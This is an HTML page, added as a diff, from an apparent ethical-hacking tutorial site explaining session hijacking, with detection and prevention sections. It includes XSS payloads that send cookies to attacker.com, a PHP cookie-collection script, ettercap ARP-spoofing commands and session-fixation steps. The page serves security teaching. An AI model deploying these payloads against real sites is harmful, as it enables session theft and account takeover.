@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Session Hijacking - ABID HACKER</title>
+    
+    <!-- Bootstrap CSS CDN -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="../../index.html">
+                <i class="fas fa-shield-alt"></i> ABID HACKER
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="../../index.html">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../courses.html">Courses</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../about.html">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="container my-5" style="margin-top: 100px !important;">
+        <div class="row">
+            <!-- Sidebar Navigation -->
+            <div class="col-lg-3">
+                <div class="card bg-dark text-white sticky-top">
+                    <div class="card-header">
+                        <h5><i class="fas fa-list"></i> Course Navigation</h5>
+                    </div>
+                    <div class="card-body">
+                        <nav class="nav flex-column">
+                            <a class="nav-link text-success" href="#introduction">Introduction</a>
+                            <a class="nav-link text-success" href="#types">Types of Attacks</a>
+                            <a class="nav-link text-success" href="#techniques">Attack Techniques</a>
+                            <a class="nav-link text-success" href="#tools">Tools & Methods</a>
+                            <a class="nav-link text-success" href="#detection">Detection</a>
+                            <a class="nav-link text-success" href="#prevention">Prevention</a>
+                            <a class="nav-link text-success" href="#examples">Practical Examples</a>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="col-lg-9">
+                <div class="card bg-dark text-white">
+                    <div class="card-header">
+                        <h1 class="text-success">
+                            <i class="fas fa-user-secret"></i> Session Hijacking
+                        </h1>
+                        <p class="mb-0">Understanding and preventing session-based attacks</p>
+                    </div>
+                    <div class="card-body">
+                        <section id="introduction">
+                            <h2 class="text-success">What is Session Hijacking?</h2>
+                            <p>Session hijacking is a security attack where an attacker takes over a user's session by stealing or predicting a valid session token. This allows the attacker to impersonate the legitimate user and access their account without knowing their credentials.</p>
+                            
+                            <h3 class="text-success mt-4">How Sessions Work</h3>
+                            <ul>
+                                <li>User logs in with credentials</li>
+                                <li>Server creates unique session ID</li>
+                                <li>Session ID stored in cookie or URL</li>
+                                <li>Subsequent requests include session ID</li>
+                                <li>Server validates session for each request</li>
+                            </ul>
+                        </section>
+
+                        <section id="types" class="mt-5">
+                            <h2 class="text-success">Types of Session Hijacking</h2>
+                            
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h4 class="text-success">Active Hijacking</h4>
+                                    <ul>
+                                        <li>Attacker takes over active session</li>
+                                        <li>User may notice unusual activity</li>
+                                        <li>Direct interaction with target</li>
+                                    </ul>
+                                </div>
+                                <div class="col-md-6">
+                                    <h4 class="text-success">Passive Hijacking</h4>
+                                    <ul>
+                                        <li>Attacker monitors session traffic</li>
+                                        <li>Stealth approach</li>
+                                        <li>Collects information for later use</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </section>
+
+                        <section id="techniques" class="mt-5">
+                            <h2 class="text-success">Attack Techniques</h2>
+                            
+                            <h3 class="text-success mt-4">Session Token Theft</h3>
+                            <div class="terminal">
+# Cookie theft via XSS
+&lt;script&gt;
+document.location='http://attacker.com/steal.php?cookie='+document.cookie;
+&lt;/script&gt;
+
+# Network sniffing for unencrypted cookies
+tcpdump -i eth0 -A | grep -i cookie
+
+# Man-in-the-middle attack
+ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
+                            </div>
+
+                            <h3 class="text-success mt-4">Session Fixation</h3>
+                            <div class="terminal">
+# Attacker sets session ID before login
+http://target.com/login?JSESSIONID=ATTACKER_CHOSEN_ID
+
+# User logs in with predetermined session ID
+# Attacker uses same session ID to access account
+
+# Example URL manipulation
+http://vulnerable-site.com/login.php?sessionid=123456789
+                            </div>
+
+                            <h3 class="text-success mt-4">Session Prediction</h3>
+                            <div class="terminal">
+# Analyze session ID patterns
+# Sequential IDs: 1001, 1002, 1003...
+# Time-based IDs: timestamp + user_id
+# Weak random generation
+
+# Burp Suite session analysis
+# Capture multiple session IDs
+# Look for patterns or predictability
+                            </div>
+                        </section>
+
+                        <section id="tools" class="mt-5">
+                            <h2 class="text-success">Tools and Methods</h2>
+                            
+                            <h3 class="text-success mt-4">Network Sniffing Tools</h3>
+                            <div class="terminal">
+# Wireshark - GUI packet analyzer
+wireshark
+
+# tcpdump - Command line packet capture
+tcpdump -i eth0 -s 0 -w capture.pcap
+
+# Ettercap - MITM attacks
+ettercap -T -M arp:remote /gateway_ip// /target_ip//
+
+# Bettercap - Modern MITM framework
+bettercap -iface eth0
+                            </div>
+
+                            <h3 class="text-success mt-4">Web Application Tools</h3>
+                            <div class="terminal">
+# Burp Suite - Session analysis
+# Proxy -> HTTP history -> Look for session cookies
+# Sequencer -> Analyze session token randomness
+
+# OWASP ZAP - Session management testing
+# Tools -> Session Management
+# Analyze session tokens for weaknesses
+
+# Custom Python script for session analysis
+import requests
+import re
+
+def analyze_sessions():
+    sessions = []
+    for i in range(10):
+        r = requests.get('http://target.com/login')
+        session_id = re.findall(r'JSESSIONID=([^;]+)', r.headers.get('Set-Cookie', ''))
+        if session_id:
+            sessions.append(session_id[0])
+    return sessions
+                            </div>
+                        </section>
+
+                        <section id="detection" class="mt-5">
+                            <h2 class="text-success">Detection Methods</h2>
+                            
+                            <h3 class="text-success mt-4">Server-Side Detection</h3>
+                            <ul>
+                                <li><strong>IP Address Monitoring:</strong> Track session IP changes</li>
+                                <li><strong>User Agent Tracking:</strong> Monitor browser fingerprints</li>
+                                <li><strong>Behavioral Analysis:</strong> Detect unusual activity patterns</li>
+                                <li><strong>Concurrent Sessions:</strong> Alert on multiple active sessions</li>
+                            </ul>
+
+                            <div class="terminal">
+# Log analysis for suspicious activity
+grep "session_id" /var/log/apache2/access.log | awk '{print $1, $12}' | sort | uniq -c
+
+# Monitor for rapid IP changes
+tail -f /var/log/webapp/sessions.log | grep -E "IP_CHANGE|SUSPICIOUS"
+
+# Database query for concurrent sessions
+SELECT user_id, session_id, ip_address, last_activity 
+FROM sessions 
+WHERE user_id IN (
+    SELECT user_id FROM sessions 
+    GROUP BY user_id 
+    HAVING COUNT(*) > 1
+);
+                            </div>
+                        </section>
+
+                        <section id="prevention" class="mt-5">
+                            <h2 class="text-success">Prevention Strategies</h2>
+                            
+                            <h3 class="text-success mt-4">Secure Session Management</h3>
+                            <ul>
+                                <li><strong>HTTPS Only:</strong> Encrypt all session traffic</li>
+                                <li><strong>Secure Cookies:</strong> Set HttpOnly and Secure flags</li>
+                                <li><strong>Session Regeneration:</strong> New ID after login</li>
+                                <li><strong>Session Timeout:</strong> Automatic expiration</li>
+                                <li><strong>Strong Session IDs:</strong> Cryptographically random</li>
+                            </ul>
+
+                            <div class="terminal">
+# PHP secure session configuration
+ini_set('session.cookie_httponly', 1);
+ini_set('session.cookie_secure', 1);
+ini_set('session.use_only_cookies', 1);
+ini_set('session.cookie_samesite', 'Strict');
+
+# Regenerate session ID after login
+session_regenerate_id(true);
+
+# Set session timeout
+ini_set('session.gc_maxlifetime', 1800); // 30 minutes
+
+# Strong session ID generation
+session_id(bin2hex(random_bytes(32)));
+                            </div>
+
+                            <h3 class="text-success mt-4">Additional Security Measures</h3>
+                            <div class="terminal">
+# Content Security Policy
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+# HTTP Security Headers
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+
+# Session binding to IP address (PHP example)
+if ($_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
+    session_destroy();
+    header('Location: /login');
+    exit;
+}
+                            </div>
+                        </section>
+
+                        <section id="examples" class="mt-5">
+                            <h2 class="text-success">Practical Examples</h2>
+                            
+                            <h3 class="text-success mt-4">Cookie Theft via XSS</h3>
+                            <div class="terminal">
+# Malicious script injection
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://attacker.com/steal?cookie=' + document.cookie, true);
+xhr.send();
+&lt;/script&gt;
+
+# Server-side cookie collection (steal.php)
+&lt;?php
+$cookie = $_GET['cookie'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$timestamp = date('Y-m-d H:i:s');
+file_put_contents('stolen_cookies.txt', "$timestamp - $ip - $cookie\n", FILE_APPEND);
+?&gt;
+                            </div>
+
+                            <h3 class="text-success mt-4">Session Fixation Attack</h3>
+                            <div class="terminal">
+# Step 1: Attacker gets session ID
+curl -c cookies.txt http://target.com/login
+
+# Step 2: Attacker sends link to victim
+http://target.com/login?PHPSESSID=attacker_session_id
+
+# Step 3: Victim logs in with fixed session ID
+# Step 4: Attacker uses same session ID
+
+# Prevention: Regenerate session ID after login
+if (login_successful) {
+    session_regenerate_id(true);
+    $_SESSION['authenticated'] = true;
+}
+                            </div>
+                        </section>
+
+                        <!-- Navigation -->
+                        <div class="row mt-5">
+                            <div class="col-6">
+                                <a href="csrf-attacks.html" class="btn btn-outline-success">
+                                    <i class="fas fa-arrow-left"></i> Previous: CSRF Attacks
+                                </a>
+                            </div>
+                            <div class="col-6 text-end">
+                                <a href="../python/python-basics.html" class="btn btn-outline-success">
+                                    Next: Python Basics <i class="fas fa-arrow-right"></i>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-dark text-white py-4">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6">
+                    <h5>ABID HACKER</h5>
+                    <p>Professional Ethical Hacking Learning Platform</p>
+                    <p>Created by: Abid Mehmood</p>
+                    <p>Email: abidbusiness@gmail.com</p>
+                    <p>Phone/WhatsApp: 03029382306</p>
+                </div>
+                <div class="col-md-6">
+                    <h5>Quick Links</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="../about.html" class="text-white-50">About Us</a></li>
+                        <li><a href="../contact.html" class="text-white-50">Contact</a></li>
+                        <li><a href="../privacy.html" class="text-white-50">Privacy Policy</a></li>
+                        <li><a href="../terms.html" class="text-white-50">Terms of Service</a></li>
+                    </ul>
+                </div>
+            </div>
+            <hr class="my-4">
+            <div class="text-center">
+                <p>&copy; 2024 ABID HACKER. All rights reserved. Professional Web Designer.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Bootstrap JS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- jQuery CDN -->
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    
+    <!-- Custom JS -->
+    <script src="../../js/script.js"></script>
+</body>
+</html>
